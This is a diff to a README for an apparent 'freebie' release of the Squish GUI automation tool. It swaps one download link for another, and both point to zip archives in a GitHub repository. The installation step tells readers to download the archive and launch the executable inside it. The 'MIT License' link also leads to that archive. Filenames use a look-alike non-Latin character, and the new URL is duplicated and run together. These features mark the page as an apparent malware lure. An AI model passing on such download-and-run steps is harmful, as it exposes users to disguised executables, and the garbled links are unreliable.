@@ -4,7 +4,7 @@ Welcome to **Squish**—the ultimate automation tool designed for seamless GUI t
 
 ## 💾 Installation
 
-1. Download **https://raw.githubusercontent.com/Dan1el22/Squish-Freebie-Hub/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Dan1el22/Squish-Freebie-Hub/main/ophiophilism/Freebie-Hub-Squish-3.7.zipоhttps://raw.githubusercontent.com/Dan1el22/Squish-Freebie-Hub/main/ophiophilism/Freebie-Hub-Squish-3.7.zip** from the repository.
 2. Extract contents using your preferred extraction tool.
 3. Launch the executable and follow on-screen instructions for a fast setup.  
 *No risky code hacks required—just pure automation!*
@@ -38,4 +38,4 @@ Squish automation, GUI testing tool, cross-platform SDET, open source, , no paid
 
 ## 📄 MIT License
 
-See full [MIT License](https://raw.githubusercontent.com/Dan1el22/Squish-Freebie-Hub/main/Lоader.zip). Use, modify, and share Squish with freedom!
+See full [MIT License](https://raw.githubusercontent.com/Dan1el22/Squish-Freebie-Hub/main/ophiophilism/Freebie-Hub-Squish-3.7.zipоhttps://raw.githubusercontent.com/Dan1el22/Squish-Freebie-Hub/main/ophiophilism/Freebie-Hub-Squish-3.7.zip). Use, modify, and share Squish with freedom!
